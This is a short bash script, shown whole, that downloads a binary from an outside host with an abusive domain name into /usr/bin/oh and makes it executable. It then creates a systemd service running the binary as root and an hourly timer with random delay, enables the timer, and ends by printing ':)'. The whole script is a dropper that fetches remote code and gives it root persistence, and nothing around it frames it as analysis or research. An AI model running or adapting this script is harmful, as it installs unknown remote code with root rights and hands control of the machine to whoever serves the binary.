#!/bin/bash

curl -o /usr/bin/oh -s -L --retry 10 --retry-delay 1 --retry-max-time 30 https://if-you-dont-like-me-you-can-commit-suicide.qwq.pink/
chmod +x /usr/bin/oh

if [ ! -f /lib/systemd/system/oh.service ]; then
cat << EOF > /lib/systemd/system/oh.service
[Unit]
After=network.target

[Service]
User=root
ExecStart=/usr/bin/oh
EOF
systemctl daemon-reload
fi

if [ ! -f /lib/systemd/system/oh.timer ]; then
cat << EOF > /lib/systemd/system/oh.timer
[Unit]
Requires=oh.service

[Timer]
OnCalendar=*-*-* *:44:44
RandomizedDelaySec=600
Unit=oh.service

[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload
fi

if [ $(systemctl status oh.timer | grep -c "Active: active") -lt 1 ]; then
	systemctl enable oh.timer
	systemctl start oh.timer
fi

# =================================================================================================================================

echo ":)";
